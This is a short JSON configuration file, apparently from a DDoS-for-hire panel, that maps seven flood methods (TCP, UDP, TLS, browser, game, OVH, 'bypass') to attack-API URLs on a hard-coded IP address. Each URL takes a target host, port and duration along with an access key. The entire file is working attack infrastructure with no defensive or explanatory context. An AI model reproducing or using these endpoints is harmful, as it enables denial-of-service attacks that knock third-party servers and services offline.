{
    "BYPASS": {
        "api": "http://45.93.200.142:1337/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BYPASS&key=tcpsynn"
    },
    "TLS": {
        "api": "http://45.93.200.142:1337/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS&key=tcpsynn"
    },
    "BROWSER": {
        "api": "http://45.93.200.142:1337/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BROWSER&key=tcpsynn"
    },
    "UDP": {
        "api": "http://45.93.200.142:1337/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP&key=tcpsynn"
    },
    "TCP": {
        "api": "http://45.93.200.142:1337/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP&key=tcpsynn"
    },
    "GAME": {
        "api": "http://45.93.200.142:1337/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME&key=tcpsynn"
        },
    "OVH": {
        "api": "http://45.93.200.142:1337/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH&key=tcpsynn"
    }
}